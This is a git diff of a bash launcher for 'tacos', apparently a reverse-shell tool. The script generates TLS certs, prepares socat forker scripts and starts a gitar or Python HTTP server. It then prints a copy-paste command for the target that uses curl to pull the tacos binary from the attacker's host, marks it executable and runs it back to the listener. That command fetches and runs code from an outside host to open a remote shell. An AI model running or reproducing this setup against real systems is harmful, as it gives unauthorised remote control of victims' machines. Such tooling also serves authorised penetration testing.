@@ -27,7 +27,13 @@ for i in "$@"; do
     esac
 done
 
-#default value
+#default value & envar
+
+SCRIPTNAME=$(readlink -f "$0")
+BASEDIR=$(dirname "$SCRIPTNAME")
+
+echo "$BASEDIR baseeee"
+
 if [[ -z "$WEBPORT" ]];
 then
     WEBPORT=8080
@@ -47,10 +53,10 @@ fi
 
 if [[ "$WINDOWS" ]]; then
     BINARY="tacos.exe"
-    SCRIPT="socat-forker-windows.sh"
+    SCRIPT=$BASEDIR"/socat-forker-windows.sh"
 else
     BINARY="tacos"
-    SCRIPT="socat-forker.sh"
+    SCRIPT=$BASEDIR"/socat-forker.sh"
 fi
 
 echo -e "\n\n\n[+] Generating tls certs and keys"
@@ -66,12 +72,10 @@ cp ${SCRIPT}.tpl ${SCRIPT}
 
 if [[ "$GITAR" ]]; then
     echo "[+] gitar shortcuts enabled on reverse shell"
-    sed -i "s/GITAR_HOST/${LHOST}/g" ${SCRIPT}
     sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
     echo "[+] launch gitar server"
-    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT}"
+    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret tacos"
 else
-    sed -i "/GITAR_HOST/d" ${SCRIPT}
     echo "[+] gitar shortcuts  not enabled"
     tmux split-window -h "python3 -m http.server ${WEBPORT}"
 fi
@@ -89,7 +93,7 @@ fi
 
 echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"
 if [[ "$GITAR" ]]; then
-	echo "(🐧) curl -O ${LHOST}:${WEBPORT}/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+	echo "(🐧) curl -O ${LHOST}:${WEBPORT}/tacos/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
 else
     echo
     echo "(🪟) curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
